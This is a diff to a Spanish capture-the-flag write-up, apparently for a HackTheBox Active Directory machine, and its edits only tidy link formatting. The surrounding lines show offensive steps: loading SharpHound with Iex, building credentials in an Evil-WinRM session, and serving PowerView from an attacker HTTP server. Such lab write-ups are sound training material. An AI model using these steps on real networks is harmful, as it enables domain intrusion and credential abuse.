@@ -330,7 +330,7 @@ Si tienes problemas con la instalación puedes instalar una versión especifica 
 
 y puedes descargar un release de `bloodhound` directamente del repositorio de github:
 
-* [https://github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)
+* [BloodHound - releases](https://github.com/BloodHoundAD/BloodHound/releases)
 
 
 Una vez instalado ejecuta el comando `neo4j console` y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto `neo4j:no4oj` y te pedira cambies la contraseña por defecto a la que desees.
@@ -356,7 +356,7 @@ Estas credenciales seran la que usaras para logearte al abrir `Bloodhound`.
 
 Ahora descargaremos el script de powershell `sharphound.ps1` que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al `bloodhound`.
 
- * [https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)
+ * [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)
 
 
 Subimos el script y lo interpretamos con `Iex`.
@@ -465,9 +465,9 @@ Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> $SecPassword = ConvertT
 Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\fmiracle', $SecPassword)
 ```
 
-Despues vamos a descargarnos e importar el modulo de `PowerView.ps1`
+Despues vamos a descargarnos e importar el modulo de `PowerView.ps1`.
 
-* [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
 ```bash
 ❯ python3 -m http.server 80
